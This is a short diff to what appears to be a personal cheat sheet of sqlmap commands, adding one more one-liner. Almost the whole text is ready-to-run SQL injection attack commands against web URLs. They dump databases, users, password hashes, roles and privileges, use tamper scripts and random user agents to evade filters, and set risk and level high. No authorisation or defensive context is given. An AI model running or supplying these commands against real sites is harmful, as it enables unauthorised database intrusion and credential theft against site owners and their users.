@@ -18,6 +18,7 @@
 // others
 1. python sqlmap.py -u "http://yoursite.com/news.php?id=1" --dbs --current-user --current-db --is-dba --users --passwords --roles --hostname --privileges
 2. python sqlmap.py -u "https://target.com/?id=1" -t 10 --tamper="between,randomcase,space2comment" --dbs --random-agent --risk=3 --level=5
+3. python sqlmap.py -u "https://..." --cookie="" --user-agent="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36" --delay=0 --timeout=30 --retries=0 --dbms=PostgreSQL --level=3 --risk=1 --threads=1 --time-sec=5 --technique=BEUSTQ --current-user --dbs
 
 // set parameter target
 sqlmap -r ./target.txt --tamper="between,randomcase,space2comment" --random-agent -p username,password
